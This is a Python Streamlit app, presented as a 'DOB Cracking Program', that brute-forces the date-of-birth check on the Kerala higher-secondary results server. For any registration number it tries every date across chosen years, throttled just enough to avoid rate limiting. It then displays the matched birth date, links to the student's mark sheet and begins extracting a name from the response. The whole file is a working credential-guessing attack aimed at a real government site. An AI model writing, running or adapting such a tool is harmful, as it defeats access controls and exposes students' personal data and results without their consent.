import streamlit as st
import requests
from datetime import datetime, timedelta
import time
import webbrowser
import json

# Hacker-style intro message with minimal delay
st.header("Initialized Python3.x")
st.header("Target server: keralaresults.nic.in")
st.header("DOB Cracking Program")
visits = '<p align="center"> <img src="https://komarev.com/ghpvc/?username=streamlitdobscrap&label=Total%20visits&color=ce9927&style=flat" alt="Analytics" /> </p>'
st.markdown(visits)
# Replace this with the actual registration number you want to use
regno = st.text_input("Enter register no : ")

# Define the years in the desired priority order
years = st.multiselect("Select years to brute force", [2006, 2005, 2007], [2006, 2005, 2007])

# Create a container for the output
output_container = st.empty()

# Flag to stop the brute force when correct DOB is found
found = False

# Custom header
headers = {
    "Referer": "https://keralaresults.nic.in"
}

# Check if registration number is provided
if regno:
    # Display a status message and keep it until the DOB is found
    with st.status("Fetching dates...", expanded=True) as status:
        st.write("Searching for birth dates...")

        # Loop through each year in the specified order
        for year in years:
            if found:
                break

            # Define the start and end dates for the current year
            start_date = datetime(year, 1, 1)
            end_date = datetime(year, 12, 31)

            # Loop through each day in the current year
            current_date = start_date
            while current_date <= end_date:
                if found:
                    break

                # Format the date components with leading zeros
                date_str = current_date.strftime("%d")  # day with leading zero
                month_str = current_date.strftime("%m")  # month with leading zero
                year_str = current_date.strftime("%Y")  # year as four digits

                # Minimal sleep time to avoid immediate rate limiting
                time.sleep(0.1)  # Sleep for 0.1 second between requests

                # Format the URL with the current date
                url = f"https://keralaresults.nic.in/dhse24mra9345/dhses.asp?treg={regno}&dob={date_str}/{month_str}/{year_str}&sid=0.6227467480652762"

                try:
                    # Send the GET request with custom headers
                    response = requests.get(url, headers=headers)

                    # Check for specific indicators in the response text
                    if 'try' in response.text:
                        output_message = f"<span style='color:red; background-color:black; padding: 5px'>{date_str}/{month_str}/{year_str}</span> - Incorrect DOB, continuing..."
                    else:
                        output_message = f"<span style='color:green;  padding: 5px'>{date_str}/{month_str}/{year_str}</span> - Correct DOB found!"
                        found = True
                        output_container.markdown(output_message, unsafe_allow_html=True)
                        break

                except requests.exceptions.RequestException as e:
                    output_message = f"Date: {date_str}/{month_str}/{year_str} - Request failed with exception: {e}"

                # Update the output container
                #output_container.markdown(output_message, unsafe_allow_html=True)

                # Move to the next day
                current_date += timedelta(days=1)

        # Update status after the loop ends
    if found:
            status.update(label="DOB Found!", state="complete", expanded=False)
            st.success(f"DOB Found: {date_str}/{month_str}/{year_str}")
            # HTML code to create a clickable link that opens in a new tab
            link = f'[View Mark sheet](https://results.kite.kerala.gov.in/hse/result_schemeI.html?regno={regno}&date1={date_str}%2F{month_str}%2F{year_str}&Submit=Submit)'
            st.markdown(link, unsafe_allow_html=True)
            urlx = "https://api.ksmart.lsgkerala.gov.in/birth-services/cr/birth-search/advanced?page=0&size=10&sort=childDetails.dateOfBirth"
            response_text=response.text
            st.balloons()
            mname_key = '"mname": "'
            start_pos = response_text.find(mname_key) + len(mname_key)
            end_pos = response_text.find('"', start_pos)

# Extract the value of "mname"
            mname = response_text[start_pos:end_pos]

            print(mname)
            firstname=mname.split()
            firstname=firstname[0]
            
    else:
            status.update(label="Brute force attack unsuccessful.", state="complete", expanded=False)
            st.error("Brute force attack unsuccessful.")
